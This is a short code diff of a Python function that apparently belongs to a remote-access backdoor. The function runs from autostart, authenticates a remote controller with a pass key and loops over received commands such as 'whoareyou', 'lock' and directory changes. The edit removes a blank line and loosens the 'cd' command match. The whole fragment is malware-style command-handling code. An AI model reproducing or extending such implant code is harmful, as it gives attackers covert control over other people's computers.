@@ -118,7 +118,6 @@ def fromAutostart():
                 if data == passKey:
                     active = True
                     Send(s, 'iamactive')
-
                     while active:
                         data = Receive(s)
                         if data == "lock":
@@ -126,7 +125,7 @@ def fromAutostart():
                             break
                         if data == 'whoareyou':
                             stdoutput = iam()
-                        elif data.startswith("cd "):
+                        elif data.startswith("cd"):
                             try:
                                 os.chdir(data[3:])
                                 stdoutput = ""
